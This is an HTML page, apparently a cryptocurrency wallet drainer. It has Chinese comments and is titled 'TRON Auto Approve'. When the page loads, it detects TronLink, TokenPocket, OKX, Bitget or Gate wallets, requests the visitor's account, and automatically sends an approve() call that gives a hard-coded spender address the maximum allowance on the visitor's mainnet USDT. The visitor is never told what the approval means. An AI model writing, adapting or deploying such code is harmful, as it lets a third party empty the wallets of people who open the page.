<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8" />
<title>TRON Auto Approve</title>
<style>
body { background:#000; color:#0f0; font-family:monospace; font-size:13px; padding:12px; }
pre { white-space:pre-wrap; }
</style>
</head>
<body>
<pre id="log"></pre>

<script>
function log(m){
  const el = document.getElementById('log');
  el.textContent += m + '\n';
  console.log(m);
}

/* 认钱包 */
function detectWallet(){
  if (window.tronLink && window.tronLink.tronWeb)
    return { name:'TronLink', tronWeb: window.tronLink.tronWeb, request: window.tronLink.request?.bind(window.tronLink) };
  if (window.tron && window.tron.tronWeb)
    return { name:'TronLink(tron)', tronWeb: window.tron.tronWeb, request: window.tron.request?.bind(window.tron) };
  if (window.tokenpocket && window.tokenpocket.tronWeb)
    return { name:'TokenPocket', tronWeb: window.tokenpocket.tronWeb, request: window.tokenpocket.request?.bind(window.tokenpocket) };
  if (window.okxwallet && window.okxwallet.tronLink && window.okxwallet.tronLink.tronWeb)
    return { name:'OKX Wallet', tronWeb: window.okxwallet.tronLink.tronWeb, request: window.okxwallet.tronLink.request?.bind(window.okxwallet.tronLink) };
  if (window.bitkeep && window.bitkeep.tronWeb)
    return { name:'Bitget Wallet', tronWeb: window.bitkeep.tronWeb, request: window.bitkeep.tronLink?.request?.bind(window.bitkeep.tronLink) };
  if (window.gatewallet && window.gatewallet.tronWeb)
    return { name:'GateWallet', tronWeb: window.gatewallet.tronWeb, request: window.gatewallet.request?.bind(window.gatewallet) };
  if (window.tronWeb)
    return { name:'Unknown TRON Wallet', tronWeb: window.tronWeb, request: null };
  return null;
}

function toBaseAmount(human, decimals){
  const [int='0', frac=''] = String(human).split('.');
  const fixed = (frac + '0'.repeat(decimals)).slice(0, decimals);
  const raw = (int + fixed).replace(/^0+(?=\d)/, '');
  return raw || '0';
}

async function main(){
  const wallet = detectWallet();
  if(!wallet){
    log('❌ 未检测到 TRON 钱包，请用钱包内置浏览器打开');
    return;
  }
  log('🪙 钱包：' + wallet.name);

  let tw = wallet.tronWeb;
  let addr = tw?.defaultAddress?.base58;

  if(!addr && wallet.request){
    log('🔄 请求账户授权...');
    try { await wallet.request({ method:'tron_requestAccounts' }); }
    catch(e){ try { await wallet.request({ method:'eth_requestAccounts' }); } catch(_){} }
    tw = wallet.tronWeb;
    addr = tw?.defaultAddress?.base58;
  }

  if(!addr){ log('❌ 拿不到地址'); return; }
  log('👛 当前地址：' + addr);

  // ===== 手动改这里 =====
  const token   = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // 主网 USDT
  // const token = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf'; // Nile USDT
  const spender = 'TG9XX5MXesQyG3V7Z9ZuorqvhU2KWuphkY';
  const human   = 115792089237316195423570985008687907853269984665640564039457584007913129639935; // 最大授权
  // =====================

  let contract;
  try {
    contract = await tw.contract().at(token);
  } catch(e){
    log('❌ 合约 at 失败：' + (e?.message || e));
    return;
  }

  let decimals = 6;
  try { decimals = Number(await contract.decimals().call()) || 6; } catch(_) {}
  const raw = toBaseAmount(human, decimals);

  log('token   = ' + token);
  log('spender = ' + spender);
  log('decimals= ' + decimals);
  log('rawAmt  = ' + raw);

  try {
    const tx = await contract.approve(spender, raw).send({ callValue: 0 });
    log('✅ approve 成功 TxID=' + tx);
  } catch(e){
    try {
      const tx = await contract.approve(spender, raw).send({ callValue:0, feeLimit: 100_000_000 });
      log('✅ approve 成功(feeLimit) TxID=' + tx);
    } catch(e2){
      log('❌ approve 失败：' + (e2?.message || e2));
    }
  }
}

// 自动执行
window.addEventListener('load', () => {
  let tries = 0;
  const timer = setInterval(() => {
    tries++;
    const w = detectWallet();
    if (w || tries >= 15){
      clearInterval(timer);
      if (w){
        main();
      } else {
        log('❌ 15 次重试后仍未检测到钱包');
      }
    }
  }, 400);
});
</script>
</body>
</html>
